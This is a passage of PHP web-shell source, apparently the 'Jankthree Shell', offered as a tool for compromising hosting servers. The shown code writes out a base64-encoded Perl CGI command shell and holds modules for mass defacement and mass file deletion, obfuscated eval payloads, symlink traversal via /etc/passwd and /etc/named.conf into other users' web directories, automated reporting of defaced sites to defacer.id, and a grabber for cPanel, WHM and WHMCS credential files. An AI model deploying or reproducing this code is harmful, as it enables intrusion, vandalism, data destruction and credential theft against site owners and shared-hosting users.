ZQ0Kew0KY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCiRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQp9DQoNCmlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQp7DQomU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KfQ0KZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCnsNCiZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KfQ0KfQ0Kc3ViIFVwbG9hZEZpbGUNCnsNCiMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSB1cGxvYWQgZm9ybSBhZ2Fpbg0KaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikNCnsNCiZQcmludFBhZ2VIZWFkZXIoImYiKTsNCiZQcmludEZpbGVVcGxvYWRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCnJldHVybjsNCn0NCiZQcmludFBhZ2VIZWFkZXIoImMiKTsNCg0KIyBzdGFydCB0aGUgdXBsb2FkaW5nIHByb2Nlc3MNCnByaW50ICI8Y29kZT5VcGxvYWRpbmcgJFRyYW5zZmVyRmlsZSB0byAkQ3VycmVudERpci4uLjxicj4iOw0KDQojIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkDQpjaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCiRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7DQokVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsNCg0KJFRhcmdldEZpbGVTaXplID0gbGVuZ3RoKCRpbnsnZmlsZWRhdGEnfSk7DQojIGlmIHRoZSBmaWxlIGV4aXN0cyBhbmQgd2UgYXJlIG5vdCBzdXBwb3NlZCB0byBvdmVyd3JpdGUgaXQNCmlmKC1lICRUYXJnZXROYW1lICYmICRPcHRpb25zIG5lICJvdmVyd3JpdGUiKQ0Kew0KcHJpbnQgIkZhaWxlZDogRGVzdGluYXRpb24gZmlsZSBhbHJlYWR5IGV4aXN0cy48YnI+IjsNCn0NCmVsc2UgIyBmaWxlIGlzIG5vdCBwcmVzZW50DQp7DQppZihvcGVuKFVQTE9BREZJTEUsICI+JFRhcmdldE5hbWUiKSkNCnsNCmJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOw0KcHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307DQpjbG9zZShVUExPQURGSUxFKTsNCnByaW50ICJUcmFuc2ZlcmVkICRUYXJnZXRGaWxlU2l6ZSBCeXRlcy48YnI+IjsNCnByaW50ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7DQp9DQplbHNlDQp7DQpwcmludCAiRmFpbGVkOiAkITxicj4iOw0KfQ0KfQ0KcHJpbnQgIjwvY29kZT4iOw0KJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KfQ0KDQpzdWIgRG93bmxvYWRGaWxlDQp7DQojIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2Fpbg0KaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikNCnsNCiZQcmludFBhZ2VIZWFkZXIoImYiKTsNCiZQcmludEZpbGVEb3dubG9hZEZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KcmV0dXJuOw0KfQ0KDQojIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQppZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwNCighJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0Kew0KJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KfQ0KZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCnsNCmNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQokVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KfQ0KDQppZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0Kew0KJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCn0NCmVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQp7DQomUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCn0NCn0NCg0KJlJlYWRQYXJzZTsNCiZHZXRDb29raWVzOw0KDQokU2NyaXB0TG9jYXRpb24gPSAkRU5WeydTQ1JJUFRfTkFNRSd9Ow0KJFNlcnZlck5hbWUgPSAkRU5WeydTRVJWRVJfTkFNRSd9Ow0KJFJ1bkNvbW1hbmQgPSAkaW57J2MnfTsNCiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsNCiRPcHRpb25zID0gJGlueydvJ307DQoNCiRBY3Rpb24gPSAkaW57J2EnfTsNCiRBY3Rpb24gPSAiY29tbWFuZCIgaWYoJEFjdGlvbiBlcSAiIik7DQoNCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQNCiRDdXJyZW50RGlyID0gJGlueydkJ307DQpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7DQppZigkQWN0aW9uIGVxICJjb21tYW5kIikgIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQNCnsNCiZFeGVjdXRlQ29tbWFuZDsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlDQp7DQomVXBsb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQ0Kew0KJkRvd25sb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgInN5bWNvbmZpZyIpDQp7DQomUHJpbnRQYWdlSGVhZGVyOw0KcHJpbnQgJlN5bUNvbmZpZzsNCn1lbHNpZigkQWN0aW9uIGVxICJoZWxwIikNCnsNCiZQcmludFBhZ2VIZWFkZXI7DQpwcmludCAmSGVscDsNCn0=";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, base64_decode($cgi_script));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<center>Done <a href='kthree_cgi/cgi2.kthree' target='_blank'><font color='lime'>Click Here</a></font>";
}

elseif($_GET['k3'] == 'mass_deface') {
	echo "<center><form action=\"\" method=\"post\">\n";
	$dirr=$_POST['d_dir'];
	$index = $_POST["script"];
	$index = str_replace('"',"'",$index);
	$index = stripslashes($index);
	function edit_file($file,$index){
		if (is_writable($file)) {
		clear_fill($file,$index);
		echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
		} 
		else {
			echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
			}
			}
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	function clear_fill($file,$index){
		if(file_exists($file)){
			$handle = fopen($file,'w');
			fwrite($handle,'');
			fwrite($handle,$index);
			fclose($handle);  } }

	function gass(){
		global $dirr , $index ;
		chdir($dirr);
		$me = str_replace(dirname(__FILE__).'/','',__FILE__);
		$files = scandir($dirr) ;
		$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
		sort($files);
		$n = 0 ;
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
				edit_file($file,$index);
				flush();
				$n = $n +1 ;
				} 
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
					}
	function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
			}

			closedir($dh);
			return $files;
		}
	}
	function gass_all(){
		global $index ;
		$dirrall=$_POST['d_dir'];
		foreach (ListFiles($dirrall) as $key=>$file){
			$file = str_replace('//',"/",$file);
			echo "<center><strong>$file</strong> ===>";
			edit_file($file,$index);
			flush();
		}
		$key = $key+1;
	echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mass'] == 'onedir') {
		echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
		$ini="http://";
		$mainpath=$_POST[d_dir];
		$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){
		$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){
			echo"$ini$row/$file\n";
			}
		}
		echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
		$mainpath=$_POST[d_dir];$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
		}

	}
	elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
	elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
	elseif($_POST['mass'] == 'massdeface') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";	}
	else {
		echo "
		<center><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input type='text' name='d_file' value='69.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By _Tuan2Fay_</textarea><br>
		<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center>";
		}
	}
elseif($_GET['k3'] == 'zip') {
	echo "<center><h1>Zip Menu</h1>";
function rmdir_recursive($dir) {
    foreach(scandir($dir) as $file) {
       if ('.' === $file || '..' === $file) continue;
       if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
       else unlink("$dir/$file");
   }
   rmdir($dir);
}
if($_FILES["zip_file"]["name"]) {
	$filename = $_FILES["zip_file"]["name"];
	$source = $_FILES["zip_file"]["tmp_name"];
	$type = $_FILES["zip_file"]["type"];
	$name = explode(".", $filename);
	$accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
	foreach($accepted_types as $mime_type) {
		if($mime_type == $type) {
			$okay = true;
			break;
		} 
	}
	$continue = strtolower($name[1]) == 'zip' ? true : false;
	if(!$continue) {
		$message = "Itu Bukan Zip  , , GOBLOK COK";
	}
  $path = dirname(__FILE__).'/';
  $filenoext = basename ($filename, '.zip'); 
  $filenoext = basename ($filenoext, '.ZIP');
  $targetdir = $path . $filenoext;
  $targetzip = $path . $filename; 
  if (is_dir($targetdir))  rmdir_recursive ( $targetdir);
  mkdir($targetdir, 0777);
	if(move_uploaded_file($source, $targetzip)) {
		$zip = new ZipArchive();
		$x = $zip->open($targetzip); 
		if ($x === true) {
			$zip->extractTo($targetdir);
			$zip->close();
 
			unlink($targetzip);
		}
		$message = "<b>Sukses Gan :)</b>";
	} else {	
		$message = "<b>Error Gan :(</b>";
	}
}	
echo '<table style="width:100%" border="1">
  <tr><td><h2>Upload And Unzip</h2><form enctype="multipart/form-data" method="post" action="">
<label>Zip File : <input type="file" name="zip_file" /></label>
<input type="submit" name="submit" value="Upload And Unzip" />
</form>';
if($message) echo "<p>$message</p>";
echo "</td><td><h2>Zip Backup</h2><form action='' method='post'><font style='text-decoration: underline;'>Folder:</font><br><input type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><font style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/kthree_backup.zip' style='width: 450px;' height='10'><br><input type='submit' name='backup' value='BackUp!' style='width: 215px;'></form>";	
	if($_POST['backup']){ 
	$save=$_POST['save'];
	function Zip($source, $destination)
{
    if (extension_loaded('zip') === true)
    {
        if (file_exists($source) === true)
        {
            $zip = new ZipArchive();

            if ($zip->open($destination, ZIPARCHIVE::CREATE) === true)
            {
                $source = realpath($source);

                if (is_dir($source) === true)
                {
                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

                    foreach ($files as $file)
                    {
                        $file = realpath($file);

                        if (is_dir($file) === true)
                        {
                            $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                        }

                        else if (is_file($file) === true)
                        {
                            $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                        }
                    }
                }

                else if (is_file($source) === true)
                {
                    $zip->addFromString(basename($source), file_get_contents($source));
                }
            }

            return $zip->close();
        }
    }

    return false;
}
	Zip($_POST['dir'],$save);
	echo "Done , Save To <b>$save</b>";
	}
	echo "</td><td><h2>Unzip Manual</h2><form action='' method='post'><font style='text-decoration: underline;'>Zip Location:</font><br><input type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br><font style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/kthree_unzip' style='width: 450px;' height='10'><br><input type='submit' name='extrak' value='Unzip!' style='width: 215px;'></form>";
	if($_POST['extrak']){
	$save=$_POST['save'];
	$zip = new ZipArchive;
	$res = $zip->open($_POST['dir']);
	if ($res === TRUE) {
		$zip->extractTo($save);
		$zip->close();
	echo 'Succes , Location : <b>'.$save.'</b>';
	} else {
	echo 'Gagal Mas :( Ntahlah !';
	}
	}
echo '</tr></table>';	
	}
	elseif($_GET['k3'] == 'shellchk') {
		eval(str_rot13(gzinflate(str_rot13(base64_decode(('vUddQtswFH1epf4HcCE1VUxbNvEwdSMGd9FeJtGhPaygyLZ5B6jc5AaHORP/fdf5IoXxsBeiSbGdZu491z6+cTiA1GVPdCkwDTIaDnM5lyVupoT5Nc1ymWWmWpZdRm9FXWOGqzguTlue4Utjpa+p53a411OCIcKZFCxqGVUES63F8XGSylAx3jr+oATX45SXE3LBubGwAsM16RLpY5Jlp+aHh1RR8jscWaPZpI0dzbay/hdZJJqkziiFUZV5t5ohSmIE1POy0M+Bl+381rjEL1whj5xmh/kwvC85oifDTp6wqlXyADr2ynAJKJgpiEaeTrCvLaDIA/J0OCD47FswS6Yi85pEzzrYVoNF2ujEg0OX0jJ1duvpWlW+hORmhxQIElNvPuS/inBksxEA98JsNaPjRIiU9civj2FpYL5jhElwWdN8KmUSZ3fm5NNn2pVFMWILSHUuPTFerhbfSYs1Xax+nV2s4u+Xl4slegNI6MckWBxvdmiUx6SRWHUftOXZ5jWmD/Gi9qAUbdMVvKPKP6elKVxA1QayIrWnG3A59y6ibiMjrDMd9OI+9UfcyU9QsvB3W5VwT4eDHam5xc85F8ACd40q3EvfeMxADe3HzatgAcLD58AhwYNoyOxJDvqc5pYhhrOHCO8Y097nXM6vJACLfvCEct6IWaMfGxj5VXOGSwk5Opai4J5n72gj0Wfza+sM+x29+D6bR5eFWaK2xCcCQcELBxy9Y8DbOjFY2nF26JjF88lC3zmYZHEJ8hYkTFaJFtp7j3dpzPvfdKxZKYx9j1CWkFJfuSbvZMzDAf78MRdXgQ724/Oz5cVtR7dA7BK95oW9TvX6id8rrLYhYIaupzSEqntthpHSeYK2aXmfYEWLxqojGkjH3mRJcryqge1uN6CvYvgbLZdJJPqPi928ml2vNqHd+yU4Q6botthiDsI//AU='))))));
	} elseif($_GET['k3'] == 'loghunter')
	{eval(str_rot13(gzinflate(str_rot13(base64_decode(("tUl7YtpVEP87VXyHiZMr0BLsPJqqgJ14QyBquuNrXEUlEExeeL2E5hZ7wS5pmu9+s7ZWgDM5RCmWJXt0f7Pz3JnJ52lphOsTQ+odbjFOjaGl1CCfWIlGTyPgLguIpQ+VoQKRYD7x8N8mDhsqC/iZRJ9DoxtDqNYDyx4xYA+20BUmvjEF7mw4wlL9WZ8J5o69b6lpcyhg8Qipju+aXkAVo35z+/az5KVGhoozmlEBilhLltbJyVCl6WULvpDx7kNE11lDpQ14NJsKY9hQKEyligc8DHNJFU8xcrXUKgRGV6hWhVooC6xMRCshRH2fz31OLQCfKtyQGVyNpOOg+DflE+hSPAhY+VyXsxRlZ6p3x+qRaWsK2sfqx3B13OZmN4E1QrZ9xuyqqkG5KyaEzCsuidTJdfbJEWEGzOYOE5PAim4j1fEJ/eSOSz7XHm5cqFE2n3bv1XwO4jeYFvfNxmyzNSgkrivclR7zuenIilALjFRpEM65SNzHY2A0nGubQ8Fdv+igZpH2sgfcAblAO6Vpj8lUPkUQYezqhVcB3r2DxaJFKL2AlvDykRjQbmRtpXt90eu0zi/+MJu9U/uijb8VuUxbclBEsBs45k+zkpS3K6iYBVLFaBylnOgI0hRL5Y3FQXRZfmiYBqEwMTNal2AkLeYk59Uya4KEVgfxLZhvd2PP9Djjmxm+i3WCbKyD0jm/ely2bV0lC8ZrMI/PSC4dTjskikOPWSQKiiRBlYk2KBQLancWQQZPKjtVNbgbxDLisK9w5ZNcjAFea4uBWE9P9T1a6/e7mtFxb8YtIi+SxYw7S8EcHX4+7R8bVxyhipKCcTHI0urpvyS8ijMz4sz1Wh6GxcLeoH3wp2nwmR/8RjF/+WNj9+FKVsElEitlvUooy9iV913ikmym133XiZ2pQbgjQUJZQrjEE5mO2peRjLGrIc0EvygbVDwqA/c8J+SOLzB2Q6kSJp0MzIZnS+ZUHcuQxS8P5vT/2KW2meKRHbey2DEnkutEuHe1GtDBZRMI6HD2F8rxaCjBjx+QTxpKDfidRgsLX/VsOyt7Mm/6IohStil49uKEetKv3+73D0KMWDsk3BP0jfIvrUvo8YG21e3o94+7mnP8FXTYGyqXptOW2vVBNe2kdNwiZh+r/Ns6D/N6WPV+vrTAT8slKBWe8WvLrREPoeMLav70RqakveP7ZuvYcdErllZIvvJ77rg0sNlJhj1PnYNCxUdCm/1rPK6MLByKKpbARIhG7ES6OQm5NTdvM7826yo34HbLiMVo85WApX0fXpBkw5+LB9CNtD7hkLPex0rFQBHbKs5S5j2nxQVCGfrXN63ehflb++a622H1zN56+/qm9OpMGzw9o09LDyIMydh1CsuTqb6lvxOKR6yiefbiK97cQF4lre4/idARGdaujmDr5XvpxPQXP/guZC3mu3GcxgGvFiMWRjD2jvXBa3biz+dp/gU="))))));}	
elseif($_GET['k3'] == 'metu') {
	

echo '<form action="?dir=$dir&k3=metu" method="post">';
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    echo 'Byee !';
	
}
elseif($_GET['k3'] == 'about') {
	
    echo '<center>Jankthree Shell<hr>Just Shell By _Tuan2Fay_ -> Saiia Edit Lagy :(<br>For More Script Visit <a href="http://cr1p.blogspot.com/">Here</a>';
	
}
elseif($_GET['k3'] == 'symlink') {
$full = str_replace($_SERVER['k3CUMENT_ROOT'], "", $dir);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("kthree_sym",0777);
@chdir("kthree_sym");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex jankthree.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/kthree_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("kthree_sym",0777);
@chdir("kthree_sym");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex jankthree.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/kthree_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("kthree_sym",0777);@chdir("kthree_sym");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex jankthree.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 = 
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file = 
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/kthree_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else 
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }    
}
elseif($_GET['k3'] == 'defacerid') {
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value'Achon666ju5t'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value='Extreme Crew'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
		<input type='submit' name='go' value='Submit' style='width: 450px;'>
		</form>";
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$hekel = $_POST['hekel'];
$tim = $_POST['tim'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://www.defacer.id/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$hekel";
$data_to_post['team'] = "$tim";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}
}
}

elseif($_GET['k3'] == 'config') {
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("kthree_config", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("kthree_config/.htaccess","w");
		fwrite($htc, $isi_htc);
		preg_match_all('/(.*?):x:/', $passwd, $user_config);
		foreach($user_config[1] as $user_kthree) {
			$user_config_dir = "/home/$user_kthree/public_html/";
			if(is_readable($user_config_dir)) {
				$grab_config = array(
										"/home/$user_kthree/.my.cnf" => "cpanel",
					"/home/$user_kthree/.accesshash" => "WHM-accesshash",
					"/home/$user_kthree/public_html/bw-configs/config.ini" => "BosWeb",
					"/home/$user_kthree/public_html/config/koneksi.php" => "Lokomedia",
					"/home/$user_kthree/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home/$user_kthree/public_html/clientarea/configuration.php" => "WHMCS",				
